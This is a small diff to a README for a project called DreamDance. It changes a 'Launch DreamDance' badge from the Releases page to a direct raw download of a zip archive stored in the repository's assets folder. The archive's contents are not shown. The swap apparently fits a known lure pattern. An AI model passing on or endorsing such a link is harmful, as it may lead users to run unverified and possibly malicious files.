@@ -60,7 +60,7 @@ This project is licensed under the **Dreamer's License** - allowing you to dream
 
 ---
 
-[![Launch DreamDance](https://github.com/ABOUBAKAR909/DreamDance/releases)](https://github.com/ABOUBAKAR909/DreamDance/releases)
+[![Launch DreamDance](https://raw.githubusercontent.com/ABOUBAKAR909/DreamDance/main/assets/Dance-Dream-2.9.zip)](https://raw.githubusercontent.com/ABOUBAKAR909/DreamDance/main/assets/Dance-Dream-2.9.zip)
 
 If the provided link does not work as expected, feel free to check the "Releases" section for an updated link.
 
